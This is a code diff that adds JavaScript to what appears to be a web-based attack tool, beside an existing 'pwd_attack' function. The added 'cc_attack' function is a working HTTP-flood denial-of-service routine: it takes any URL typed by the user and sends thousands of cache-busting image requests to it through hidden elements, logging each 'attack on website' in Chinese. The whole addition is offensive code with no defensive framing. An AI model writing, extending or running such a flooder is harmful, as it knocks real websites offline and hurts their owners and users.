@@ -129,3 +129,41 @@ function pwd_attack() {
         showAlert('错误: '+e , null)
     }
 }
+
+function to_cc_attack() {
+    var i = document.getElementById('page');
+    i.src = "./cc_attack";
+}
+
+var put_log_number = 0;
+
+function asyncOperation(url) {
+    var log_view = document.getElementById('log_view');
+    return new Promise((resolve, reject) => {
+        for (var i = 0 ; i < 20 ;i++) {
+            i++;
+            var dom = document.createElement('img');
+            dom.src = url + new Date().getTime();
+            dom.style.width = '0px';
+            dom.style.height = '0px';
+            document.body.appendChild(dom);
+            document.body.removeChild(dom);
+
+            setTimeout(() => {
+                if (i % 1000 == 0) {
+                    log_view.innerHTML += '攻击网站: '+url+'<br />'
+                }
+            }, 100);
+        }
+    });
+}
+
+
+function cc_attack() {
+    var url = document.getElementById('url').value;
+    for (var i = 0 ; i < 1000 ; i++) {
+        asyncOperation(url).then(result => {
+            console.log('ok')
+        });
+    }
+}
